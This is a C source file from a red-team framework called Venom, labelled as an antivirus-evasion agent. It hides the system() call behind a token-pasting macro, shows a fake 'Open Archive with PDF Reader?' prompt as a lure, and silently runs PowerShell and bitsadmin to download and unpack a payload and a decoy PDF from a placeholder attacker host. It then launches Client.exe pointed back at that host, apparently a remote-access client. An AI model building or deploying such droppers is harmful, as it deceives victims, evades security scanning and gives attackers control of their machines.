/*
Author: r00t-3xp10it (SSA RedTeam @2020)
Framework: Venom v1.0.17.4 - Amsi Evasion - Agent nº5
Description: C PreProcessor (macro) system API's obfuscation.
*/

#include<stdio.h>
#include<stdlib.h>
#include<winsock2.h>
#include<windows.h>
#define _____(d,y,i,o,q,h)(i##d##h##y##o##q)
#define _ _____(y,t,s,e,m,s)

int main()
{
    MessageBox(NULL, "Open Archive with PDF Reader?", "Portable Document Format (PDF)", MB_OK);
   _("powershell -w 1 -C bitsadmin /transfer ssaredteam http://LhOsT/Client.zip FiNaL\\Client.zip && powershell Expand-Archive -Force FiNaL\\Client.zip FiNaL");
   _("powershell -w 1 -C bitsadmin /transfer ssaredteam http://LhOsT/FiLNaMe.pdf FiNaL\\FiLNaMe.pdf");
   _("cd TempDir && cmd /R start /min Client.exe ip=LhOsT port=LpOrT");
   return 0;
}
